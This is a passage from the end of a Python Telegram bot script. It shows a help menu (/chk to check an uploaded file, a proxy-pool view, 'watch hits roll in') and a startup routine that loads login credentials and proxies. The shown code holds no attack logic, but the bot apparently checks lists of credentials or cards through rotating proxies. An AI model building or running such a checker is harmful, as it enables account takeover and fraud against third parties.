            e('arrow_r') + " Reply with <code>/chk</code>",
            "",
            e('arrow_r') + " Watch hits roll in " + e('diamond'),
            "",
            "<b>Commands:</b>",
            "• <code>/start</code> — welcome",
            "• <code>/chk</code> — check (reply to file)",
            "• <code>/stop</code> — stop run",
            "• <code>/proxies</code> — view proxy pool",
            "• <code>/menu</code> — main menu",
            "",
            "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>",
            e('crown2') + " <b>Bot By " + OWNER_TAG + "</b>",
        ])
        bot.edit_message_text(
            chat_id=c.message.chat.id, message_id=c.message.message_id,
            text=txt, reply_markup=back_kb(), parse_mode="HTML"
        )

# ── MAIN ──
if __name__ == "__main__":
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN missing! Set env var.")
        exit(1)
    if not LOGIN_USER or not LOGIN_PASS:
        print("⚠️  LOGIN_USER / LOGIN_PASS missing — login will fail")

    print("🚀 " + BOT_NAME + " starting…")
    print("🛡 Proxies loaded: " + str(len(PROXIES)))
    for p in PROXIES:
        print("   • " + masked_proxy(p))
    bot.infinity_polling(timeout=30, long_polling_timeout=30)
